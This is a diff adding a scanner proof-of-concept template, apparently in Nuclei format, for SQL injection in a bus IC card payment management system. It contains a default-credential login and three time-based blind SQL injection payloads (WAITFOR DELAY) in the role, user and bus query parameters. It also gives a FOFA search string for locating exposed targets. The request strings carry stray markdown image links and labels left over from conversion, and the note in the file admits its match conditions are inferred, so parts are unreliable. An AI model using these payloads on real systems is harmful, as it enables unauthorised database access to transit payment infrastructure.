@@ -1,0 +1,132 @@
+id: poc-gy15sz5v40bwq1ey
+info:
+  name: 公交IC卡收单管理系统 多处 SQL注入致RCE漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gy15sz5v40bwq1ey
+
+    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: rce,sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: gy15sz5v40bwq1ey
+    fofa: app="公交IC卡收单管理系统"
+http:
+- raw:
+  - 'POST /login HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept: */*
+
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+    Accept-Encoding: gzip, deflate
+
+    Priority: u=0
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    X-Requested-With: XMLHttpRequest
+
+    username=admin&password=e10adc3949ba59abbe56e057f20f883e
+
+    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1727413433850-a8b529a7-29ef-4729-b78d-0cd5f8658fa6.png)
+
+    **填入Cookie插入Payload延时5秒 **
+
+    **PoC-1**'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'POST /role HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept: application/json, text/javascript, */*; q=0.01
+
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
+
+    Accept-Encoding: gzip, deflate
+
+    Cookie: JSESSIONID=BE20D06711487C9D6D5325C1129F244C
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    X-Requested-With: XMLHttpRequest
+
+    _search=false&nd=1727245571646&rowCountPerPage=10&pageNo=1&sidx=ROLE_NAME&sord=asc&method=select&ROLE_NAME=1'');WAITFOR DELAY ''0:0:5''--
+
+
+    **POC-2**'
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && duration >= 5
+    condition: and
+- raw:
+  - 'POST /user HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept: application/json, text/javascript, */*; q=0.01
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    X-Requested-With: XMLHttpRequest
+
+    Accept-Encoding: gzip, deflate
+
+    Cookie: JSESSIONID=BE20D06711487C9D6D5325C1129F244C
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
+
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+    _search=false&nd=1727245865182&rowCountPerPage=10&pageNo=1&sidx=USER_NAME&sord=asc&method=select&USER_NAME=1'');WAITFOR DELAY ''0:0:5''--&REAL_NAME=1&ACCOUNT_EXPIRE_TIME=%E5%BF%BD%E7%95%A5&PASSWORD_EXPIRE_TIME=%E5%BF%BD%E7%95%A5
+
+
+    **POC3**'
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && duration >= 5
+    condition: and
+- raw:
+  - 'POST /bus HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
+
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+    Cookie: JSESSIONID=BE20D06711487C9D6D5325C1129F244C
+
+    Accept: application/json, text/javascript, */*; q=0.01
+
+    X-Requested-With: XMLHttpRequest
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    _search=false&nd=1727248354972&rowCountPerPage=10&pageNo=1&sidx=BUS_CODE&sord=asc&method=select&BUS_CODE=1'');WAITFOR DELAY ''0:0:5''--
+
+
+    **POC4**'
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && duration >= 5
+    condition: and
